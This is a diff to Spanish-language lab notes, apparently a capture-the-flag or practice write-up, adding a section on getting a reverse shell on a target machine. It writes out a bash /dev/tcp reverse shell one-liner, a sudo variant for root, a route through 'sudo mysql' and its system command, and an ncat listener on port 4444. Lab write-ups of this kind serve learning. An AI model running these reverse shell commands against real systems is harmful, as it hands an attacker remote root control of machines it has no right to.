@@ -262,6 +262,24 @@ Probando encontramos una **vulnerabilidad** tipo **Format String Vulnerability**
 
 
 
+# Reverse shell
+Para reverse shell he encontrado 2 formas de hacerlo:
+## 1. Directamente por SSH
+en este caso no tenemos ni que poner sudo, cosa que está mal ya que poniendo unicamente bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1'
+aunque en este caso no estamos como root sino que estamos como user
+![[Pasted image 20251203094526.png]]
+y viendo sudo -l vemos que tenemos permisos con este usuario para hacer de todo por lo que si queremos uqe la reverse shell sea desde un inicio como root para no tener que ir poniendo sudo podemos poner sudo bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1'
+## 2. A través de SQL
+conectandonos a la maquina por ssh con ssh user@192.168.207.130 accedemos como user aunque tenemos permiso de sudo, igualmente podemos hacer una reverse shell para estar como root ya que están mal configurados los permisos de sql, antes de nada tenemos que ponernos a escuchar por el puerto que queramos (en este caso el 4444) con
+ncat -nlvp 4444
+despues en la terminal en la que estamos por ssh:
+sudo mysql (conectarnos a sql)
+system bash -c "bash -i >& /dev/tcp/192.168.207.1/4444 0>&1"
+
+con esto en la terminal donde ponemos ncat nos llega 
+![[Pasted image 20251203094003.png]]
+donde vemos que tenemos permiso de root y estamos efectivamente dentro de la maquina
+
 
 
 
